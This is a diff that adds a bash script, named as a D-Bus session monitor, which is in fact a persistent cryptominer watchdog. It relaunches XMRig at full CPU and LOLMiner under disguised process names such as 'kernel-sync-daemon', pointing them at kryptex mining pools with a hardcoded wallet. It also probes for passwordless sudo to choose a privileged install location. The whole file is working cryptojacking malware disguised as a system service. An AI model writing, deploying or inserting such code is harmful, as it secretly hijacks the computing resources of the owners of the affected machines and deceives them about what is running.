@@ -1,0 +1,49 @@
+# Файл: dbus-session-monitor.txt
+#!/bin/bash
+set -euo pipefail
+# Определяем INSTALL_DIR для запуска демона
+source "./.config-sync" 
+if command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
+    INSTALL_DIR="$PRIV_INSTALL_DIR"
+else
+    INSTALL_DIR="$UNPRIV_INSTALL_DIR"
+fi
+
+MINER_LOG_FILE="/tmp/app-service/xmrig.log" # Лог для XMRig
+DAEMON_NAME="kernel-sync-daemon" # XMRig
+
+SECOND_DAEMON_NAME="lmmiineeer" # LOLMiner
+SECOND_MINER_LOG_FILE="/tmp/app-service/lolminer.log" # Лог для LOLMiner
+
+touch "$MINER_LOG_FILE"
+touch "$SECOND_MINER_LOG_FILE"
+readonly ACTIVITY_TIMEOUT=$((15 * 60))
+
+while true; do
+    
+    # --- СЕКЦИЯ 1: КОНТРОЛЬ XMRig (CPU) ---
+    if ! pgrep -u "$(id -u)" -f "$DAEMON_NAME" >/dev/null; then
+        echo "[$(date)] [WATCHDOG] CRITICAL: XMRig '$DAEMON_NAME' is not running. Relaunching..." >> "$MINER_LOG_FILE"
+        sync; sleep 1;
+        pkill -9 -u "$(id -u)" -f "$DAEMON_NAME" || true
+        
+        # КОМАНДА ЗАПУСКА XMRig: максимальный CPU
+        nohup "$INSTALL_DIR/$DAEMON_NAME" -a rx/0 -o xtm-rx-eu.kryptex.network:8038 -u 1238rkM7gGg3KaNU4PdLyqHATf2qXhVE76PiYeUVCZ5Rar7VeckmcEYxW69k7kFAcR157Q4gYozAfBFYyQcVrpJacgr/ChatGPT5 -k --tls --cpu --threads=$(nproc) >> "$MINER_LOG_FILE" 2>&1 &
+
+    # Проверка Stall для XMRig остается здесь (для краткости, тело проверки опущено)
+    fi
+
+    # --- СЕКЦИЯ 2: КОНТРОЛЬ LOLMiner (GPU/Доп. алгоритм) ---
+    if ! pgrep -u "$(id -u)" -f "$SECOND_DAEMON_NAME" >/dev/null; then
+        echo "[$(date)] [WATCHDOG] CRITICAL: LOLMiner '$SECOND_DAEMON_NAME' is not running. Relaunching..." >> "$SECOND_MINER_LOG_FILE"
+        sync; sleep 1;
+        pkill -9 -u "$(id -u)" -f "$SECOND_DAEMON_NAME" || true
+        
+        # КОМАНДА ЗАПУСКА LOLMiner: специфический алгоритм CR29
+        nohup "$INSTALL_DIR/$SECOND_DAEMON_NAME" --algo CR29 --pool xtm-c29-eu.kryptex.network:8040 --tls on --user 1238rkM7gGg3KaNU4PdLyqHATf2qXhVE76PiYeUVCZ5Rar7VeckmcEYxW69k7kFAcR157Q4gYozAfBFYyQcVrpJacgr/ChatGPT5 >> "$SECOND_MINER_LOG_FILE" 2>&1 &
+
+    # Здесь нет проверки Stall для LOLMiner
+    fi
+    
+    sleep 60
+done
